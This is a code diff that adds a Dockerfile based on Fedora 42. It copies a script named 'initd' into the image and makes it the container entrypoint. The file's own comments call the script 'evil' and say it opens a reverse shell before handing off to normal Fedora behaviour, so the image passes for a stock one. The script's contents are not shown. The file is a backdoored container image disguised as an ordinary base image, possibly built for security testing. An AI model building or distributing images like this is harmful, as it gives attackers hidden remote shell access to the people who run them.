@@ -1,0 +1,14 @@
+FROM fedora:42@sha256:6af051ad0a294182c3a957961df6203d91f643880aa41c2ffe3d1302e7505890
+
+RUN dnf install -y procps-ng hostname
+
+# Copy the evil script
+COPY initd /opt/initd
+RUN chmod +x /opt/initd
+
+# Set the evil script as entrypoint
+# This will run first, establish reverse shell, then chain to original Fedora behavior
+ENTRYPOINT ["/opt/initd"]
+
+# Default command (can be overridden, just like real Fedora)
+CMD ["/bin/bash"]
